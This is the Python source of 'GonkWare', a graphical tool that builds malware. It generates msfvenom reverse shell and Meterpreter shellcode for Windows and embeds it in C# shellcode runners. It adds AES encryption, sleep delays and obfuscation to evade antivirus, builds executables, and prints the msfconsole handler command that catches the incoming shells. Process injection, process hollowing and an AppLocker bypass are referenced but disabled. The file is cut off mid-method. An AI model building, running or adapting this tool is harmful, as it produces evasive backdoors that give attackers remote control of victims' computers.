import os, subprocess, pyperclip, re, json, base64, random, string, threading, glob, psutil
import ttkbootstrap as tb
from ttkbootstrap.constants import *
from ttkbootstrap.scrolled import ScrolledText
from PIL import Image, ImageTk
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

class GonkWareApp:
    def __init__(self, root):
        self.root = root
        root.title("Hexxed BitHeadz - GonkWare")
        root.resizable(True, True)
        self.register = self.root.register
        self.marquee_job = None

        # Screen resolution and dynamic sizing
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()

        # Set to half the screen width, full screen height
        window_width = screen_width // 2
        window_height = int(screen_height * 0.9)
        
        # Position at the top-left corner
        x_offset = 0
        y_offset = 0

        root.geometry(f"{window_width}x{window_height}+{x_offset}+{y_offset}")

        # ttkbootstrap theme setup
        self.style = tb.Style("flatly")

        # Loading images
        self.loading_images = [ImageTk.PhotoImage(Image.open(path).resize((192, 192)))
                            for path in glob.glob("media/*.png")]
        self.shuffled_images = []
        self.image_index = 0

        self.template_data = self.load_template_data()

        self.create_frames()

    def create_frames(self):
        self.style.configure("BaseLabel.TLabel",
            font=("Consolas", 15, "bold"),
            background="#000000"
        )

        # Custom styles for labels
        self.style.configure("SectionLabel.TLabel",
            font=("Consolas", 15, "bold"),
            foreground="#91ddd3",
            background="#000000"
        )

        # Shared base label style config
        base_label_config = {
            "font": ("Consolas", 15, "bold"),
            "background": "#000000"
        }

        # Apply base config once
        self.style.configure("BaseLabel.TLabel", **base_label_config)

        # Inherit and override foregrounds
        self.style.configure("SectionLabel.TLabel", **base_label_config, foreground="#91ddd3")
        self.style.configure("MSFLabel.TLabel", **base_label_config, foreground="#fefe00")
        self.style.configure("SleepLabel.TLabel", **base_label_config, foreground="#3B5BB7")
        self.style.configure("StatusLabel.TLabel", **base_label_config, foreground="#EC1C3A")

        # Bottom status label (slightly different)
        self.style.configure("BottomStatusLabel.TLabel",
            font=("Consolas", 13, "italic"),
            foreground="#91ddd3",
            background="#000000"
        )

        self.style.configure("Neon.TCheckbutton",
            font=("Consolas", 15, "bold"),
            foreground="#ec1c3a",
            background="#000000",
            indicatorbackground="#000000",
            selectcolor="#000000"
        )

        self.style.configure("RedCombo.TCombobox",
            fieldbackground="#000000",
            background="#000000",
            foreground="#E61C38",
            arrowcolor="#E61C38",
            bordercolor="#E61C38",
            selectbackground="#000000",
            selectforeground="#E61C38",
            lightcolor="#000000",
            darkcolor="#000000",
            borderwidth=1,
            relief="flat"
        )

        self.style.map("RedCombo.TCombobox",
            fieldbackground=[("readonly", "#000000")],
            foreground=[("readonly", "#E61C38")],
            background=[("readonly", "#000000")]
        )

        self.style.configure("RedEntry.TEntry",
            foreground="#E61C38",
            fieldbackground="#000000",
            insertcolor="#E61C38",
            font=("Consolas", 12, "bold")
        )

        self.style.configure("Custom.TFrame", background="#000000")
        self.style.configure("CopyButton.TButton", font=("Consolas", 15, "bold"))
        self.style.configure("BuildExe.TButton", font=("Consolas", 15, "bold"))
        self.style.configure("Generate.TButton", font=("Consolas", 15, "bold"))
        self.style.configure("OpenFolder.TButton", font=("Consolas", 15, "bold"))



        left_frame = tb.Frame(self.root, bootstyle="dark", width=275)
        left_frame.pack(side=tb.LEFT, fill=tb.BOTH, expand=True)

        right_frame = tb.Frame(self.root, bootstyle="dark", width=275)
        right_frame.pack(side=tb.RIGHT, fill=tb.BOTH, expand=True)

        center_frame = tb.Frame(self.root, bootstyle="dark", width=250)
        center_frame.pack(side=tb.RIGHT, fill=tb.BOTH, expand=True)

        self.root.configure(background="#1f2523")

        # Load and resize background images
        self.left_bg_image = ImageTk.PhotoImage(Image.open("frameImages/left_bg.png").resize((275, self.root.winfo_screenheight())))
        self.right_bg_image = ImageTk.PhotoImage(Image.open("frameImages/right_bg.png").resize((275, self.root.winfo_screenheight())))

        self.left_bg_original = Image.open("frameImages/left_bg.png")
        self.right_bg_original = Image.open("frameImages/right_bg.png")

        self.right_bg_label = tb.Label(right_frame, bootstyle="dark")
        self.right_bg_label.place(x=0, y=0, relwidth=1, relheight=1)

        # Bind resize events
        left_frame.bind("<Configure>", self.resize_left_bg)
        right_frame.bind("<Configure>", self.resize_right_bg)

        # Create labels to hold the background images
        self.left_bg_label = tb.Label(left_frame, image=self.left_bg_image, bootstyle="dark")
        self.left_bg_label.place(x=0, y=0, relwidth=1, relheight=1)

        self.right_bg_label = tb.Label(right_frame, image=self.right_bg_image, bootstyle="dark")
        self.right_bg_label.place(x=0, y=0, relwidth=1, relheight=1)

        # Output display
        text_frame = tb.Frame(center_frame)
        text_frame.pack(padx=10, pady=10, fill=tb.BOTH, expand=True)

        scrollbar = tb.Scrollbar(text_frame)
        scrollbar.pack(side=tb.RIGHT, fill=tb.Y)

        self.output_text = tb.Text(text_frame, yscrollcommand=scrollbar.set, background="#000", foreground="#fefe00", wrap=tb.WORD)

        self.output_text.pack(fill=tb.BOTH, expand=True)

        self.output_text.configure(
        background="#000000",
        foreground="#fefe00",
        insertbackground="#fefe00",
        selectbackground="#333333",
        font=("Consolas", 10, "bold")
        ) 

        scrollbar.config(command=self.output_text.yview)

        self.output_bg_original = Image.open("frameImages/center_bg.png")
        self.output_bg_image = ImageTk.PhotoImage(self.output_bg_original.resize((150, 150)))

        self.output_text.bind("<Configure>", self.resize_center_bg)

        # Insert image into text widget
        self.output_text.image_create("1.0", image=self.output_bg_image)
        self.output_text.tag_lower("sel")

        #self.technique_options = ["Shellcode Runner", "Process Injection", "Process Hollowing"]
        self.technique_options = ["Shellcode Runner"]
        self.selected_technique = tb.StringVar()
        self.selected_technique.set(self.technique_options[0])

        technique_label = tb.Label(left_frame, text="TECHNIQUE:", style="SectionLabel.TLabel")
        technique_label.pack(pady=5, padx=10, anchor="nw")
        technique_dropdown = tb.Combobox(
            left_frame,
            textvariable=self.selected_technique,
            values=self.technique_options,
            state="readonly",
            style="RedCombo.TCombobox",
        )

        technique_dropdown.configure(font=("Consolas", 12, "bold"), width=16)
        technique_dropdown.pack(pady=5, padx=10, anchor="nw")

        # Dropdown for shellcode format selection
        self.format_options = ["csharp"]
        self.selected_format = tb.StringVar()
        self.selected_format.set(self.format_options[0])
        
        format_label = tb.Label(left_frame, text="FORMAT:", style="SectionLabel.TLabel")
        format_label.pack(pady=5, padx=10, anchor="nw")
        
        format_dropdown = tb.Combobox(left_frame, textvariable=self.selected_format, values=self.format_options, state="readonly", style="RedCombo.TCombobox")
        
        format_dropdown.configure(font=("Consolas", 12, "bold"), width=16)
        format_dropdown.pack(pady=5, padx=10, anchor="nw")
        
        # Radio buttons for architecture selection
        self.architecture = tb.StringVar()
        self.architecture.set("x64")
        
        arch_label = tb.Label(left_frame, text="ARCHITECTURE:", style="SectionLabel.TLabel")
        arch_label.pack(pady=5, padx=10, anchor="nw")

        x64_radio = self.create_radio(left_frame, "x64", self.architecture, "x64")
        x64_radio.pack(pady=2, padx=10, anchor="nw")

        x86_radio = self.create_radio(left_frame, "x86", self.architecture, "x86")
        x86_radio.pack(pady=2, padx=10, anchor="nw")
            
        # Radio buttons for payload type selection
        self.payload_type = tb.StringVar()
        self.payload_type.set("shell")
        
        self.style.configure("Custom.TLabel", font=("Consolas", 20, "bold"), foreground="#91ddd3", background="#000000")

        payload_label = tb.Label(left_frame, text="PAYLOAD:", style="SectionLabel.TLabel")
        payload_label.pack(pady=5, padx=10, anchor="nw")
        
        shell_radio = self.create_radio(left_frame, "Shell", self.payload_type, "shell")
        self.apply_hover_effect(shell_radio, var=self.payload_type)
        shell_radio.pack(pady=2, padx=10, anchor="nw")  

        meterpreter_radio = self.create_radio(left_frame, "Meterpreter", self.payload_type, "meterpreter")
        
        self.apply_hover_effect(meterpreter_radio, var=self.payload_type)
        meterpreter_radio.pack(pady=2, padx=10, anchor="nw")
        
        # Dropdown for connection type selection
        self.connection_options = ["tcp", "http", "https"]
        self.selected_connection = tb.StringVar()
        self.selected_connection.set(self.connection_options[0])
        
        connection_label = tb.Label(left_frame, text="CONNECTION:", style="SectionLabel.TLabel")

        connection_label.pack(pady=5, padx=10, anchor="nw")
        
        connection_dropdown = tb.Combobox(left_frame, textvariable=self.selected_connection, values=self.connection_options, state="readonly", style="RedCombo.TCombobox")

        connection_dropdown.configure(font=("Consolas", 12, "bold"), width=16)
        connection_dropdown.pack(pady=5, padx=10, anchor="nw")
        
        # Dropdown for interface type selection
        self.network_interface_options = psutil.net_if_addrs().keys()
        self.selected_interface = tb.StringVar()
        self.selected_interface.set(list(self.network_interface_options)[0])

        interface_label = tb.Label(left_frame, text="INTERFACE:", style="SectionLabel.TLabel")
        interface_label.pack(pady=5, padx=10, anchor="nw")

        interface_dropdown = tb.Combobox(left_frame, textvariable=self.selected_interface, values=list(self.network_interface_options), state="readonly", style="RedCombo.TCombobox")
        interface_dropdown.configure(font=("Consolas", 12, "bold"), width=16)
        interface_dropdown.pack(pady=5, padx=10, anchor="nw")

        # Entry for port number
        self.port = tb.StringVar(value="443")

        port_label = tb.Label(
            left_frame,
            text="PORT:",
            style="SectionLabel.TLabel"
        )
        port_label.pack(pady=5, padx=10, anchor="nw")

        # Validation function
        def validate_port(new_value):
            if not new_value:
                return True
            if new_value.isdigit():
                try:
                    val = int(new_value)
                    return 1 <= val <= 65535
                except ValueError:
                    return False
            return False

        # Register the validation callback
        vcmd = (self.root.register(validate_port), "%P")

        port_entry = tb.Entry(
            left_frame,
            textvariable=self.port,
            validate="key",
            validatecommand=vcmd,
            style="RedEntry.TEntry",
            width=6
        )

        port_entry.pack(pady=5, padx=10, anchor="nw")

        # Generate button
        generate_button = tb.Button(
            left_frame,
            text="Generate",
            command=self.generate_shellcode_threaded,
            bootstyle="danger",
            style="Generate.TButton",
            width=15
        )
        generate_button.pack(pady=10, padx=10, anchor="nw")
        self.generate_button = generate_button

        options_label = tb.Label(
            right_frame,
            text="OPTIONS:",
            style="SectionLabel.TLabel",
            justify="right",
            anchor="e",
            
        )
        options_label.pack(pady=5, padx=10, anchor="ne")

        # AES checkbox
        self.aes_checkbox_var = tb.BooleanVar()

        self.aes_checkbox = self.create_neon_checkbox(
            right_frame,
            text="AES",
            variable=self.aes_checkbox_var,
            state=tb.DISABLED,
            width=12,
        )

        self.aes_checkbox.pack(pady=5, padx=10, anchor="ne")  # right-align in layout
        self.aes_checkbox_var.trace_add("write", self.toggle_aes_encryption)

        # Sleep checkbox
        self.sleep_checkbox_var = tb.BooleanVar()
        self.sleep_checkbox = self.create_neon_checkbox(
            right_frame,
            text="Sleep",
            variable=self.sleep_checkbox_var,
            state=tb.DISABLED,
            justify="right",
            anchor="e"
        )
        self.sleep_checkbox.pack(pady=10, padx=10, anchor="ne")
        self.sleep_checkbox_var.trace_add("write", self.toggle_sleep_option)

        sleep_duration_label = tb.Label(
            right_frame,
            text="SECONDS:",
            style="SleepLabel.TLabel"            
        )
        sleep_duration_label.pack(pady=10, padx=10, anchor="ne")

        self.sleep_duration_var = tb.StringVar(value="5")
        self.sleep_duration_var.trace_add("write", self.on_sleep_duration_change)

        self.sleep_duration_dropdown = tb.Combobox(
            right_frame,
            textvariable=self.sleep_duration_var,
            values=["5", "10", "15", "20", "25"],
            state="readonly",
            style="RedCombo.TCombobox",
            width=5
        )
        self.sleep_duration_dropdown.configure(font=("Consolas", 12, "bold"), width=4)
        self.sleep_duration_dropdown.pack(pady=10, padx=10, anchor="ne")

        # Obfuscation checkbox
        self.obfuscation_checkbox_var = tb.BooleanVar()
        self.obfuscation_checkbox = self.create_neon_checkbox(
            right_frame,
            text="Obf",
            variable=self.obfuscation_checkbox_var,
            state=tb.DISABLED,
            justify="right",
            anchor="e"
        )
        self.obfuscation_checkbox.pack(pady=10, padx=10, anchor="ne")
        self.obfuscation_checkbox_var.trace_add("write", self.toggle_obfuscation)

        # self.applocker_bypass_checkbox_var = tb.BooleanVar()
        # self.applocker_bypass_checkbox = self.create_neon_checkbox(
        #     right_frame,
        #     text="AppLocker",
        #     variable=self.applocker_bypass_checkbox_var,
        #     state=tb.DISABLED,
        #     justify="right",
        #     anchor="e"
        # )
        # self.applocker_bypass_checkbox.pack(pady=10, padx=10, anchor="ne")

        self.msf_button_text = tb.StringVar()
        self.msf_button_text.set("MSF quick copy")

        # MSF command label
        msf_label = tb.Label(left_frame, text="MSF COMMAND:", style="MSFLabel.TLabel")
        msf_label.configure(font=("Consolas", 15, "bold"))
        msf_label.pack(pady=10, padx=10, anchor="nw")

        msf_frame = tb.Frame(left_frame, style="Custom.TFrame")
        msf_frame.pack(padx=10, pady=5, anchor="nw")

        # Create Entry
        self.msf_entry = tb.Text(
        msf_frame,
        background="#FEFE00",                
        foreground="#000000",                
        insertbackground="#000000", 
        relief=tb.FLAT,
        highlightthickness=0,
        font=("Consolas", 15, "bold"),
        height=1,
        width=15
        )

        self.msf_entry.configure(
            foreground="#000000", 
            background="#FEFE00", 
            insertbackground="#000000"
        )

        self.update_msf_entry(self.msf_button_text.get())

        self.msf_entry.tag_configure("left", justify="left")
        self.msf_entry.tag_add("left", "1.0", "end")

        self.msf_entry.configure(font=("Consolas", 15, "bold"))
        self.msf_entry.pack(side="left", fill="x", expand=True)

        # Create a button to copy the MSF command
        self.copy_button = tb.Button(
            left_frame,
            text="Copy",
            style="CopyButton.TButton",
            command=self.copy_msf_command,
            width=10,
            state=tb.DISABLED
)
        self.copy_button.pack(padx=10, pady=5, anchor="nw")

        # Button to build EXE from C# code
        self.build_button = tb.Button(
            right_frame,
            text="Build EXE",
            command=self.build_exe_from_output,
            style="BuildExe.TButton",
            bootstyle="danger",
            state=tb.DISABLED
        )

        self.build_button.pack(pady=50, padx=10, anchor="se")

        self.open_folder_button = tb.Button(
            right_frame,
            text="Open",
            command=self.open_output_folder,
            style="OpenFolder.TButton",
            bootstyle="info",
        )
        self.open_folder_button.pack(pady=5, padx=10, anchor="se")
        self.open_folder_button.pack_forget()  # Start hidden

        # Label for status updates
        self.top_status_label = tb.Label(
            right_frame,
            text="Status:",
            style="StatusLabel.TLabel"
        )
        self.top_status_label.configure(font=("Consolas", 15, "bold"))
        self.top_status_label.pack(pady=5, padx=10, anchor="se")

        self.bottom_status_label = tb.Label(
            right_frame,
            text="Idle",
           style="BottomStatusLabel.TLabel"
        )
        self.bottom_status_label.pack(pady=(0, 10), padx=10, anchor="se")

        self.sleep_duration_dropdown.config(state="disabled")

        # Loading image label
        self.loading_image_label = tb.Label(
            right_frame,
            bootstyle="dark",
            borderwidth=0,
            style="Loading.TLabel"
        )

        self.loading_image_label.pack(pady=(10, 20), anchor="s")
        self.loading_image_label.place_forget()

    def create_radio(self, parent, text, variable, value):
        style = tb.Style()

        # Sanitize text to avoid reserved prefixes like "meter"
        safe_text = re.sub(r'\W|^(meter)', '_', text, flags=re.IGNORECASE)
        style_name = f"CustomRadio.{safe_text}.TRadiobutton"

        if not style.lookup(style_name, "font"):
            style.configure(
                style_name,
                font=("Consolas", 12, "bold"),
                foreground="#ec1c3a",
                background="#000000",
                indicatorcolor="#ec1c3a",
                indicatorbackground="#000000",
                indicatorrelief="flat",
            )

        radio = tb.Radiobutton(
            parent,
            text=text,
            variable=variable,
            value=value,
            style=style_name,
            bootstyle="danger"
        )

        self.apply_hover_effect(radio, style_name, var=variable)
        return radio

    def generate_shellcode_backend(self):

        selected_format = self.selected_format.get()
        arch = self.architecture.get()
        payload = self.payload_type.get()
        connection = self.selected_connection.get()
        interface = self.selected_interface.get()
        port = self.port.get()

        if not port.isdigit():
            raise ValueError("Invalid port number.")

        command = f"msfvenom -p windows/{'x64/' if arch == 'x64' else ''}{payload}/reverse_{connection} LHOST={interface} LPORT={port} -f {selected_format}"
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)

        if selected_format == "csharp":
            shellcode_data = [line.strip() for line in result.split("\n") if "0x" in line]
            shellcode_bytes = re.findall(r"0x[0-9a-fA-F]+", "\n".join(shellcode_data))
            shellcode_formatted = ", ".join(shellcode_bytes)
            shellcode_only = [f"{x}" for x in shellcode_bytes]
            shellcode_only = ",\n".join(", ".join(shellcode_only[i:i+8]) for i in range(0, len(shellcode_only), 8))
        else:
            raise ValueError("Unsupported format selected.")

        wrapped_shellcode = f"byte[] buf = new byte[] {{\n        {shellcode_formatted}\n    }};"       
        selected_template = self.get_selected_template()
        directives = "\n".join(selected_template.get("directives", []))
       
        function_decls = "\n    ".join(selected_template.get("function_declarations", []))
        code_blocks = selected_template.get("code_blocks", {})
        all_code_lines = []
        for key, block in code_blocks.items():
            all_code_lines.append(f"    // --- {key.replace('_', ' ').title()} ---")
            all_code_lines.extend(f"    {line}" for line in block)
            all_code_lines.append("")

        main_code = "\n".join(all_code_lines).replace("PLACEHOLDER_SHELLCODE", wrapped_shellcode)
        constant_decls = "\n    ".join(selected_template.get("constant_declarations", []))

        final_script = f"""
{directives}
class Program
{{
    {function_decls}
    {constant_decls}
    static void Main()
    {{
{main_code}
    }}
}}
"""

        msf_cmd = self.build_msfconsole_cmd()
        return final_script, shellcode_only, msf_cmd

    def generate_shellcode_threaded(self):
        # Set the status to "Generating"
        self.update_generation_state(enabled=False)

        self.start_glitch_animation()

        # Stop any existing marquee job
        if self.marquee_job:
            self.root.after_cancel(self.marquee_job)
            self.marquee_job = None

        self.top_status_label.config(text="Shellcode")

        # Deselect all checkboxes
        self.aes_checkbox_var.set(False)
        self.sleep_checkbox_var.set(False)
        self.obfuscation_checkbox_var.set(False)
        # self.applocker_bypass_checkbox_var.set(False)

        # Clear output text in center_frame
        self.output_text.configure(state="normal")
        self.output_text.delete("1.0", tb.END)
        self.output_text.configure(state="disabled")

        # Disable all options
        self.aes_checkbox.config(state=tb.DISABLED)
        self.sleep_checkbox.config(state=tb.DISABLED)
        self.sleep_duration_dropdown.config(state=tb.DISABLED)
        self.obfuscation_checkbox.config(state=tb.DISABLED)
        # self.applocker_bypass_checkbox.config(state=tb.DISABLED)

        # Start the shellcode generation in a separate thread
        thread = threading.Thread(target=self.threaded_shellcode_generate)
        thread.start()

        # Clear MSF entry

    def threaded_shellcode_generate(self):
        try:
            final_script, shellcode_only, msf_cmd = self.generate_shellcode_backend()
            self.root.after(0, lambda: self.finish_shellcode_generate(final_script, shellcode_only, msf_cmd))
        except Exception as e:
            self.root.after(0, lambda: self.output_text.insert(tb.END, f"\n[!] Error: {str(e)}"))
            self.root.after(0, lambda: self.update_generation_state(enabled=True)) 

    def finish_shellcode_generate(self, script, shellcode_only, msf_cmd):
        self.shellcode_only = shellcode_only
        self.original_shellcode = script
        self.full_msf_cmd = msf_cmd

        self.render_script(script)

        self.msf_entry.configure(
            state="normal",
            foreground="#000000",
            background="#FEFE00",
            insertbackground="#000000"
        )
        self.msf_entry.delete("1.0", tb.END)
        self.msf_entry.insert("1.0", msf_cmd)
        self.msf_entry.configure(state="disabled")

        self.copy_button.configure(state=tb.NORMAL)
        self.build_button.configure(state=tb.NORMAL)

        self.aes_checkbox.config(state=tb.NORMAL)
        self.sleep_checkbox.config(state=tb.NORMAL)
        self.sleep_duration_dropdown.config(state="readonly")
        self.obfuscation_checkbox.config(state=tb.NORMAL)
        # self.applocker_bypass_checkbox.config(state=tb.NORMAL)

        self.start_marquee()
        self.loading_image_label.place_forget() 
        self.stop_glitch_animation()

        # One call to update everything
        self.update_generation_state(
            enabled=True,
            top_text="Shellcode",
            bottom_text="Generated",
            color="#00ff00"
        )


    def load_template_data(self):
        template_map = {
            "Shellcode Runner": "templates/ShellcodeRunner.json",
            "Process Injection": "templates/ProcessInjection.json",
            "Process Hollowing": "templates/ProcessHollowing.json"
        }

        template_data = {}
        for technique, path in template_map.items():
            if os.path.exists(path):
                key = technique.replace(" ", "")
                template_data[technique] = self.load_template(path, key)

            else:
                print(f"Template file not found: {path}")

        return template_data

    def toggle_aes_encryption(self, *args):
        self.output_text.delete('1.0', tb.END)

        if self.aes_checkbox_var.get():
            if not hasattr(self, 'shellcode_only'):
                self.output_text.configure(state="normal")
                self.output_text.insert(tb.END, "Shellcode not generated yet.\n")
                self.output_text.configure(state="disabled")
                return

            # Generate AES encrypted shellcode
            formatted_csharp_shellcode = self.shellcode_only.replace('\n', '').strip()
            csharp_style_input = f"byte[] buf = new byte[] {{ {formatted_csharp_shellcode} }};"
            self.aes_encrypt_shellcode(csharp_style_input)

            # Load AES template
            aes_template_path = "templates/AES.json"
            if not os.path.exists(aes_template_path):
                self.output_text.configure(state="normal")
                self.output_text.insert(tb.END, "AES template not found.\n")
                self.output_text.configure(state="disabled")
                return

            aes_template = self.load_template(aes_template_path, "ShellcodeRunnerAES")

            # Build final script with AES + optional sleep + obfuscation
            final_script = self.build_final_script(
                template=aes_template,
                aes_data=self.aes_data,
                inject_sleep=self.sleep_checkbox_var.get(),
                sleep_duration=int(self.sleep_duration_var.get()) * 1000,
                obfuscate=self.obfuscation_checkbox_var.get()
            )
            self.render_script(final_script)

        else:
            if not hasattr(self, "original_shellcode"):
                self.output_text.configure(state="normal")
                self.output_text.insert(tb.END, "No original shellcode to restore.\n")
                self.output_text.configure(state="disabled")
                return

            if not self.sleep_checkbox_var.get():
                self.output_text.configure(state="normal")
                self.output_text.insert(tb.END, self.original_shellcode)
                self.output_text.configure(state="disabled")
                return

            selected_template = self.get_selected_template()
            if not selected_template:
                self.output_text.configure(state="normal")
                self.output_text.insert(tb.END, "Unknown technique selected.\n")
                self.output_text.configure(state="disabled")
                return

            final_script = self.build_final_script(
                template=selected_template,
                shellcode=self.wrap_shellcode(self.shellcode_only),
                inject_sleep=True,
                sleep_duration=int(self.sleep_duration_var.get()) * 1000,
                obfuscate=self.obfuscation_checkbox_var.get()
            )
            self.render_script(final_script)

    def aes_encrypt_shellcode(self, csharp_shellcode_str):
        shellcode = bytes(int(x, 16) for x in re.findall(r"0x[0-9a-fA-F]+", csharp_shellcode_str))

        key = os.urandom(16)
        iv = os.urandom(16)

        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted_shellcode = cipher.encrypt(pad(shellcode, AES.block_size))

        b64_shellcode = base64.b64encode(encrypted_shellcode).decode()
        b64_key = base64.b64encode(key).decode()
        b64_iv = base64.b64encode(iv).decode()

        # Store AES values for template injection
        self.aes_data = {
            "b64_shellcode": b64_shellcode,
            "b64_key": b64_key,
            "b64_iv": b64_iv
        }

        return (
            f'string encryptedShellcodeB64 = "{b64_shellcode}";\n'
            f'string keyB64 = "{b64_key}";\n'
            f'string ivB64 = "{b64_iv}";\n'
        )

    def inject_sleep_code(self, code, directives, function_declarations, sleep_duration):
        sleep_json_path = "templates/Sleep.json"
        if os.path.exists(sleep_json_path):
            sleep_template = self.load_template(sleep_json_path, "Sleep")

            sleep_code = sleep_template.get("code_block", [])
            sleep_code = [line.replace("SLEEP_DURATION", str(sleep_duration)) for line in sleep_code]
                
            # Inject sleep block at the top of main code
            code = "\n    ".join(sleep_code) + "\n\n" + code

            # Add function declarations if needed
            for decl in sleep_template.get("function_declarations", []):
                if decl not in function_declarations:
                    function_declarations += "\n    " + decl

        return code, directives, function_declarations

    def toggle_sleep_option(self, *args):
        self.output_text.delete('1.0', tb.END)

        # Toggle the dropdown based on checkbox state
        if self.sleep_checkbox_var.get():
            self.sleep_duration_dropdown.config(state="readonly")
        else:
            self.sleep_duration_dropdown.config(state="disabled")

        if not hasattr(self, "original_shellcode"):
            self.output_text.configure(state="normal")
            self.output_text.delete("1.0", tb.END)
            self.output_text.insert(tb.END, "Generate shellcode first.\n")
            self.output_text.configure(state="disabled")
            return

        if self.aes_checkbox_var.get():
            self.toggle_aes_encryption()
        else:
            # Rebuild original template with sleep only
            selected_template = self.get_selected_template()
            if not selected_template:
                self.output_text.configure(state="normal")
                self.output_text.delete("1.0", tb.END)
                self.output_text.insert(tb.END, "Unknown technique selected.\n")
                self.output_text.configure(state="disabled")
                return

            directives = "\n".join(selected_template.get("directives", []))
            function_declarations = "\n    ".join(selected_template.get("function_declarations", []))
            function_definitions = ""

            # Build code blocks
            code_blocks = selected_template.get("code_blocks", {})
            all_code_lines = []

            for key, block in code_blocks.items():
                all_code_lines.append(f"    // --- {key.replace('_', ' ').title()} ---")
                all_code_lines.extend(f"    {line}" for line in block)
                all_code_lines.append("")

            code = "\n".join(all_code_lines)
            code = code.replace("PLACEHOLDER_SHELLCODE", self.wrap_shellcode(self.shellcode_only))

            # Inject sleep
            if self.sleep_checkbox_var.get():

                sleep_duration = int(self.sleep_duration_var.get()) * 1000
                code, directives, function_declarations = self.inject_sleep_code(
                    code, directives, function_declarations, sleep_duration
                )

            final_script = f"""
{directives}

class Program
{{
    {function_declarations}
    static void Main()
    {{
{code}
    }}
    {function_definitions}
}}
"""                        
            # After final_script is constructed
            if self.obfuscation_checkbox_var.get():
                final_script = self.apply_obfuscation(final_script)

            self.output_text.configure(state="normal")
            self.output_text.delete("1.0", tb.END)
            self.output_text.insert(tb.END, final_script.strip())
            self.output_text.configure(state="disabled")

    def toggle_obfuscation(self, *args):
        self.output_text.delete('1.0', tb.END)

        if not hasattr(self, "original_shellcode"):
            self.output_text.configure(state="normal")
            self.output_text.delete("1.0", tb.END)
            self.output_text.insert(tb.END, "Generate shellcode first.\n")
            self.output_text.configure(state="disabled")
            return

        if self.aes_checkbox_var.get():
            self.toggle_aes_encryption()
        elif self.sleep_checkbox_var.get():
            self.toggle_sleep_option()
        else:
            obfuscated_code = self.apply_obfuscation(self.original_shellcode)
            self.output_text.configure(state="normal")
            self.output_text.delete("1.0", tb.END)
            self.output_text.insert(tb.END, obfuscated_code)
            self.output_text.configure(state="disabled")

    def apply_obfuscation(self, code):
        def rand_var(length=8):
            return ''.join(random.choices(string.ascii_letters, k=length))

        # 1. Rename common identifiers
        identifiers = re.findall(r'\b(buf|key|iv|data|RunShellcode)\b', code)
        rename_map = {id_: rand_var() for id_ in identifiers}
        for old, new in rename_map.items():
            code = re.sub(rf'\b{old}\b', new, code)

        # Skip string literals inside DllImport attributes
        dllimport_lines = [line for line in code.splitlines() if "[DllImport" in line]
        protected_literals = set()
        for line in dllimport_lines:
            protected_literals.update(re.findall(r'"[^"]+"', line))

        # Encode all other string literals (skip ones starting with $")
        all_literals = re.findall(r'"[^"]+"', code)
        for literal in all_literals:
            if literal in protected_literals or literal.startswith('$"'):
                continue  # Skip DllImport or interpolated strings
            raw = literal.strip('"')
            b64 = base64.b64encode(raw.encode()).decode()
            decode_snippet = f'System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("{b64}"))'
            code = code.replace(literal, decode_snippet)

        # 3. Insert junk code inside Main()
        code_lines = code.splitlines()
        start_index = None
        end_index = None
        brace_count = 0
        inside_main = False

        for i, line in enumerate(code_lines):
            if "static void Main" in line:
                start_index = i
                inside_main = True
                brace_count += line.count("{") - line.count("}")
                continue

            if inside_main:
                brace_count += line.count("{")
                brace_count -= line.count("}")
                if brace_count == 0:
                    end_index = i
                    break

        if start_index is not None and end_index is not None and end_index - start_index > 2:
            insert_at = random.randint(start_index + 2, end_index - 1)
            code_lines.insert(insert_at, self.generate_dead_code_block())

        # Restore code
        code = "\n".join(code_lines)

        return code

    def generate_dead_code_block(self):
        def rand_var(length=8):
            return ''.join(random.choices(string.ascii_letters, k=length))

        s = rand_var()
        val = rand_var()
        return f"""{{  // Junk Code Start
        int {rand_var()} = {random.randint(1, 100)};
        string {s} = "{val}";
        Console.WriteLine({s});
    }}  // Junk Code End"""

    def render_script(self, script):
        if self.obfuscation_checkbox_var.get():
            script = self.apply_obfuscation(script)

        self.output_text.configure(state="normal")
        self.output_text.delete("1.0", tb.END)
        
        self.output_text.insert(tb.END, script.strip(), "bold")
        self.output_text.configure(state="disabled")

    def wrap_shellcode(self, shellcode_str):
        return f"byte[] buf = new byte[] {{\n        {shellcode_str}\n    }};"

    def build_msfconsole_cmd(self):
        return f"msfconsole -q -x 'use exploit/multi/handler;set payload windows/{'x64/' if self.architecture.get() == 'x64' else ''}{self.payload_type.get()}/reverse_{self.selected_connection.get()};set LHOST {self.selected_interface.get()};set LPORT {self.port.get()};set ExitonSession false;run -j'"

    def create_neon_checkbox(self, parent, text, variable, **kwargs):
        style = tb.Style()
        
        # Create a unique style name per checkbox based on the label text
        safe_text = re.sub(r'\W|^(meter)', '_', text, flags=re.IGNORECASE)
        style_name = f"CustomCheck.{safe_text}.TCheckbutton"

        if not style.lookup(style_name, "font"):
            style.configure(
                style_name,
                font=("Consolas", 15, "bold"),
                foreground="#ec1c3a",
                background="#000000",
                indicatorbackground="#000000",
                selectcolor="#000000"
            )

        checkbox = tb.Checkbutton(
            parent,
            text=text,
            variable=variable,
            style=style_name,
            state=kwargs.get("state", tb.NORMAL),
            bootstyle="",
            takefocus=False
        )

        def on_enter(e):
            style.configure(style_name, foreground="#ff3c5f")

        def on_leave(e):
            style.configure(style_name, foreground="#ec1c3a")

        def flicker(step=0):
            flicker_colors = ["#91ddd3", "#ec1c3a"]
            if step < 6:
                style.configure(style_name, foreground=flicker_colors[step % 2])
                self.root.after(100, lambda: flicker(step + 1))
            else:
                style.configure(style_name, foreground="#ec1c3a")

        def on_toggle(*_):
            if variable.get():
                flicker()

        checkbox.bind("<Enter>", on_enter)
        checkbox.bind("<Leave>", on_leave)
        variable.trace_add("write", on_toggle)

        return checkbox

    def resize_center_bg(self, event):
        # Resize the original image to match the widget size
        resized = self.output_bg_original.resize((event.width, event.height))
        self.output_bg_image = ImageTk.PhotoImage(resized)

        # Only reinsert the image if there's no text (initial state)
        current_text = self.output_text.get("1.0", tb.END).strip()
        if not current_text:
            self.output_text.image_create("1.0", image=self.output_bg_image)
            self.output_text.tag_lower("sel") 

    def resize_left_bg(self, event):
        resized = self.left_bg_original.resize((event.width, event.height))
        self.left_bg_image = ImageTk.PhotoImage(resized)
        self.left_bg_label.configure(image=self.left_bg_image)
        self.left_bg_label.image = self.left_bg_image

    def resize_right_bg(self, event):
